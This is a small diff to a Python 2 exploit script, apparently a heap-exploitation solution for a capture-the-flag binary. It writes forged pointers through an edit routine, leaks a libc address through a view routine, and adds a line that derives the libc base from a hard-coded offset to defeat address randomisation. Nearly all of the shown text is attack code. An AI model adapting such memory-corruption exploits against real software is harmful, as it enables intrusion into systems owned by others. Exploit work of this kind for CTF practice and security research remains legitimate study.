@@ -88,6 +88,8 @@ def main():
 	edit(p64(0)*2 + p64(0xfc)*2 + p64(0x603010) + p64(0x603040) + p64(p_ret))
 
 	p_libc = u64(view(2)[:-1].ljust(8, '\0'))
+	base_libc=p_libc - 0x20511
+	
 	print "[+] libc 0x%x" % p_libc
 	raw_input("[DEBUG]")
 
